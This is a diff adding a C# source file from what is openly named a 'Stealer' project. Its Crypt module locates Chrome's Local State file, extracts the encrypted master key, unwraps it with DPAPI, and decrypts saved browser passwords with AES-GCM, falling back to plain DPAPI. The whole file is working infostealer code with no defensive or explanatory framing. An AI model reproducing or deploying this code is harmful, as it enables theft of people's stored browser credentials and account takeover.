@@ -1,0 +1,76 @@
+﻿using System;
+using System.IO;
+using System.Text;
+using System.Text.RegularExpressions;
+
+namespace Stealer.modules
+{
+  internal class Crypt
+  {
+    public static string decryptChrome(string password, string browser = "")
+    {
+      if (password.StartsWith("v10") || password.StartsWith("v11"))
+      {
+        string path = "";
+        string[] strArray1 = new string[3]
+        {
+          "",
+          "\\..",
+          "\\..\\.."
+        };
+        foreach (string str in strArray1)
+        {
+          path = Path.GetDirectoryName(browser) + str + "\\Local State";
+          if (!File.Exists(path))
+            path = (string) null;
+          else
+            break;
+        }
+        string str1 = File.ReadAllText(path);
+        string[] strArray2 = Regex.Split(str1, "\"");
+        int num = 0;
+        foreach (string str2 in strArray2)
+        {
+          if (str2 == "encrypted_key")
+          {
+            str1 = strArray2[num + 2];
+            break;
+          }
+          ++num;
+        }
+        byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(str1)).Remove(0, 5)), (byte[]) null);
+        try
+        {
+          string s1 = password.Substring(3, 12);
+          string s2 = password.Substring(15);
+          byte[] bytes = Encoding.Default.GetBytes(s1);
+          return AesGcm256.Decrypt(Encoding.Default.GetBytes(s2), key, bytes);
+        }
+        catch
+        {
+          return "failed (AES-GCM)";
+        }
+      }
+      else
+      {
+        try
+        {
+          return Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(password), (byte[]) null));
+        }
+        catch
+        {
+          return "failed (DPAPI)";
+        }
+      }
+    }
+
+    public static string toUTF8(string text)
+    {
+      Encoding encoding1 = Encoding.GetEncoding("UTF-8");
+      Encoding encoding2 = Encoding.GetEncoding("Windows-1251");
+      byte[] bytes1 = encoding2.GetBytes(text);
+      byte[] bytes2 = Encoding.Convert(encoding1, encoding2, bytes1);
+      return encoding2.GetString(bytes2);
+    }
+  }
+}
